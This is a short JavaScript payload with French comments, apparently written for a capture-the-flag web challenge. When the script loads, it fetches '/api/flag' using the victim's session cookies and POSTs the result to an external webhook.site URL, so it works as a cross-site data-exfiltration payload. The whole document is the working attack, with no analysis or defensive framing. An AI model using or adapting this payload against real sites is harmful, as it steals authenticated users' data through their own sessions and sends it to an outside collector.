// Cette fonction récupère le flag via une requête API GET
function fetchAndSendFlag() {
    fetch('/api/flag', {
        method: 'GET',
        credentials: 'include',  // Cela permet d'inclure les cookies de session si nécessaire
    })
    .then(response => response.json())
    .then(data => {
        // Assurez-vous que la réponse contient bien un 'flag'
        if (data && data.flag) {
            // Envoie le flag à un webhook pour le récupérer à distance
            fetch('https://webhook.site/2e771e56-2d9f-482a-91af-24b27aa9fb2c', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ flag: data.flag })  // Envoie le flag au webhook
            })
            .then(res => res.json())
            .then(resData => {
                console.log('Réponse du webhook:', resData);
            })
            .catch(error => {
                console.error('Erreur lors de l\'envoi au webhook:', error);
            });
        } else {
            console.error('Flag introuvable dans la réponse.');
        }
    })
    .catch(error => {
        console.error('Erreur lors de la récupération du flag:', error);
    });
}

// Lorsque le script se charge, récupérer et envoyer le flag
fetchAndSendFlag();
